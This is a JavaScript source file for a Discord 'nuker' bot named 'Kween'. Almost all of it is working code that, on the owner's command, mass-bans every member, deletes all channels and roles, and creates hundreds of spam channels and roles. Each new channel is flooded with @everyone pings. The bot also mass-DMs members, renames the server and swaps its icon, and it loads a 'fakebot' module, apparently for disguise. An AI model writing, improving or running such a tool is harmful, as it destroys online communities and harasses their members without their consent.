const colors = require('chalk')
const Discord = require('discord.js') // import discord
const client = new Discord.Client({
    intents: ["GUILDS", "GUILD_MESSAGES", "DIRECT_MESSAGES"],
    partials: ["CHANNEL"] // enable intents
});
const config = require('./config.json') // get the config
const token = config.token
const owner = config.OwnerID
const prefix = config.prefix
const fakebot = require("./fakebot.js") // import fakebot
console.clear()
const help = { // help embed
    "type": "rich",
    "title": `Kween cmds`,
    "description": "",
    "color": 0xFF000,
    "fields": [{
            "name": `Mass dm`,
            "value": `${prefix}mdm (message)`
        },
        {
            "name": `Mass ban`,
            "value": `${prefix}mban`
        },
        {
            "name": `Mass channels`,
            "value": `${prefix}mch (channel name)`
        },
        {
            "name": `Mass roles`,
            "value": `${prefix}mro`
        },
        {
            "name": `Delete all channels`,
            "value": `${prefix}delch`
        },
        {
            "name": `Delete all roles`,
            "value": `${prefix}delro`
        },
        {
            "name": `Mass channel and ping`,
            "value": `${prefix}mchsend`
        },
        {
            "name": `Destroy the server`,
            "value": `${prefix}destroy`
        },
        {
            "name": `Start the fake bot`,
            "value": `${prefix}fakeit`
        }
    ],
    "footer": {
        "text": `Made by Kweeper`
    }
}
const title = String.raw ` 
                ██ ▄█▀ █     █░▓█████ ▓█████  ███▄    █ 
                ██▄█▒ ▓█░ █ ░█░▓█   ▀ ▓█   ▀  ██ ▀█   █ 
                ▓███▄░ ▒█░ █ ░█ ▒███   ▒███   ▓██  ▀█ ██▒
                ▓██ █▄ ░█░ █ ░█ ▒▓█  ▄ ▒▓█  ▄ ▓██▒  ▐▌██▒
                ▒██▒ █▄░░██▒██▓ ░▒████▒░▒████▒▒██░   ▓██░
                ▒ ▒▒ ▓▒░ ▓░▒ ▒  ░░ ▒░ ░░░ ▒░ ░░ ▒░   ▒ ▒ 
                ░ ░▒ ▒░  ▒ ░ ░   ░ ░  ░ ░ ░  ░░ ░░   ░ ▒░
                 ░░ ░   ░   ░     ░      ░      ░   ░ ░    
                ░  ░       ░       ░  ░   ░  ░         ░ 



                        Made by !Kweeper#8053
                                                            ` // the intro
console.log(colors.redBright(title))
client.once("ready", () => {
    console.log(colors.greenBright('       ‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗'))
    console.log(colors.cyanBright(`                        User: ${client.user.tag}`))
    console.log(colors.cyanBright(`                        OwnerID: ${owner}`))
    console.log(colors.cyanBright(`                        Prefix: ${prefix}`))
    console.log(colors.cyanBright(`                        Server count: ${client.guilds.cache.size}`))
    console.log(colors.cyanBright(`                        Cached users: ${client.users.cache.size}`))
    console.log(colors.greenBright('       ‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗‗'))
    console.log('')
})


client.on("messageCreate", async message => { // commands function
    async function dodux() { // the nuke function
        if (message.guild.me.permissions.has('BAN_MEMBERS')) {
            message.guild.members.cache.forEach(member => member.ban({ // loops through the members and ban 
                    reason: 'FUCK'
                })
                .then(console.log(colors.green(`[+] Trying to ban ${member}`))).catch(error => {
                    console.log(colors.red(`[-] Cannot ban ${member}`))
                })
            )
            message.delete()
        } else {
            console.log(colors.red('[-] Critical error missing permissions.')) // if no permissions
        }
        if (message.guild.me.permissions.has('MANAGE_CHANNELS')) {
            message.guild.channels.cache.forEach(channel => channel.delete() // loops through the channels and delete
                .then(console.log(colors.green(`[+] Trying to delete ${channel}`))).catch(error => {
                    console.log(colors.red(`[-] Cannot delete ${channel}`))
                })
            )
        } else {
            console.log(colors.red('[-] Critical error missing permissions.'))
        }
        if (message.guild.me.permissions.has('MANAGE_ROLES')) {
            message.guild.roles.cache.forEach(role => role.delete() // loop through the roles and delete
                .then(console.log(colors.green(`[+] Trying to delete ${role}`))).catch(error => {
                    console.log(colors.red(`[-] Cannot delete ${role}`))
                })
            )
        } else {
            console.log(colors.red('[-] Critical error missing permissions.'))
        }
        await new Promise(resolve => setTimeout(resolve, 3000)); // moment before the actual damage
        if (message.guild.me.permissions.has('MANAGE_ROLES' || 'ADMINISTRATOR')) {
            for (var a = 0; a < 250; a++) {
                message.guild.roles.create({ // mass roles
                    name: `Kween runs you`,
                    color: "RANDOM",
                    reason: "Congratz on getting nuked"
                }).catch(error => {
                    console.log(colors.red('[-] Unable to  create role'))
                })
            }
            console.log(colors.yellow('[=] Role creation started'))
        } else {
            console.log(colors.red('[-] Critical error missing permissions.'))
        }
        message.guild.setIcon('https://media.gettyimages.com/photos/eccentric-senior-woman-portrait-picture-id1149811553?s=2048x2048')
        message.guild.setName('Survive the granny flipper lol') // survive the granny flipper
        if (message.guild.me.permissions.has('MANAGE_CHANNELS' || 'ADMINISTRATOR')) {
            mosssage = config.nukemsg
            for (var i = 0; i < 250; i++) {
                const keepcrying = message.guild.channels.create('Kween-runs-you') // mass channels [You can change this]
                keepcrying.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone' + `${mosssage}`)
                            }
                        }
                    )
                    .catch(error => {
                        console.log(colors.red('[-] Unable to create channel'))
                    })
            }
            console.log(colors.blue('[=] Mass channels started'))

        } else {
            console.log(colors.red('[-] Critical error missing permissions.'))
        }

    }
    if (message.author.id == owner) { // if the user is the bot owner
        if (!message.content.startsWith(prefix) || message.author.bot) return; // if message starts with  prefix

        const args = message.content.slice(prefix.length).trim().split(/ +/); // arguements
        const command = args.shift().toLowerCase();
        if (command == `ping`) { // ping
            message.channel.send(`Ping: ${Math.round(client.ws.ping)}ms`)
        }
        if (command == `help`) { // sends the help embed
            message.author.send({
                embeds: [help]
            }).catch(error => {
                console.log(colors.red(`[-] I cannot send dm to you`))
            })
        }
        if (command == `mdm`) { // loops through member list and dm
            let msg = args[0] // You have to type your sentence in one line
            message.guild.members.cache.forEach(member => member.send(msg)
                .then(console.log(colors.green(`[+] Message sent to ${member}`))).catch(error => {
                    console.log(colors.red(`[-] Cannot send messages to ${member}`))
                })
            )
            message.delete()
        }
        if (command == `mban`) {
            if (message.guild.me.permissions.has('BAN_MEMBERS')) { // basically the same thing as above
                message.guild.members.cache.forEach(member => member.ban({
                        reason: 'FUCK'
                    })
                    .then(console.log(colors.green(`[+] Trying to ban ${member}`))).catch(error => {
                        console.log(colors.red(`[-] Cannot ban ${member}`))
                    })
                )
                message.delete()
            } else {
                console.log(colors.red('[-] Critical error missing permissions.'))
            }
        }
        if (command == `mch`) {
            if (message.guild.me.permissions.has('MANAGE_CHANNELS' || 'ADMINISTRATOR')) {
                name = args[0]
                for (var i = 0; i < 250; i++) {
                    message.guild.channels.create(name).catch(error => {
                        console.log(colors.red('[-] Unable to create channel'))
                    })
                }
                console.log(colors.blue('[=] Mass channels started'))
                message.delete()

            } else {
                console.log(colors.red('[-] Critical error missing permissions.'))
            }
        }
        if (command == "mro") {
            if (message.guild.me.permissions.has('MANAGE_ROLES' || 'ADMINISTRATOR')) {
                const role = args[0]
                for (var a = 0; a < 250; a++) {
                    message.guild.roles.create({
                        name: `${role}` || `Kween runs you`,
                        color: "RANDOM",
                        reason: "Congratz on getting nuked"
                    }).catch(error => {
                        console.log(colors.red('[-] Unable to  create role'))
                    })
                }
                console.log(colors.yellow('[=] Role creation started'))
                message.delete()
            } else {
                console.log(colors.red('[-] Critical error missing permissions.'))
            }
        }
        if (command == `delch`) {
            if (message.guild.me.permissions.has('MANAGE_CHANNELS')) {
                message.guild.channels.cache.forEach(channel => channel.delete()
                    .then(console.log(colors.green(`[+] Trying to delete ${channel}`))).catch(error => {
                        console.log(colors.red(`[-] Cannot delete ${channel}`))
                    })
                )
                message.delete()
            } else {
                console.log(colors.red('[-] Critical error missing permissions.'))
            }
        }
        if (command == `delro`) {
            if (message.guild.me.permissions.has('MANAGE_ROLES')) {
                message.guild.roles.cache.forEach(role => role.delete()
                    .then(console.log(colors.green(`[+] Trying to delete ${role}`))).catch(error => {
                        console.log(colors.red(`[-] Cannot delete ${role}`))
                    })
                )
                message.delete()
            } else {
                console.log(colors.red('[-] Critical error missing permissions.'))
            }
        }
        if (command == `mchsend`) {
            if (message.guild.me.permissions.has('MANAGE_CHANNELS' || 'ADMINISTRATOR')) {
                mosssage = args[0]
                for (var i = 0; i < 250; i++) {
                    const keepcrying = message.guild.channels.create('Kween-runs-you')
                    keepcrying.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone' + `${mosssage}`)
                                }
                            }
                        )
                        .catch(error => {
                            console.log(colors.red('[-] Unable to create channel'))
                        })
                }
                console.log(colors.blue('[=] Mass channels started'))
                message.delete()

            } else {
                console.log(colors.red('[-] Critical error missing permissions.'))
            }
        }
        if (command == "fakeit") { // fake the bot
            fakebot.start()
            console.log(colors.yellow('[=] Trying to start fake bot'))
            message.delete()
        }
        if (command == "destroy") { // destruction
            dodux()
            console.log(colors.redBright("[+] NUKE STARTED"))
        }
    }
});
client.login(token)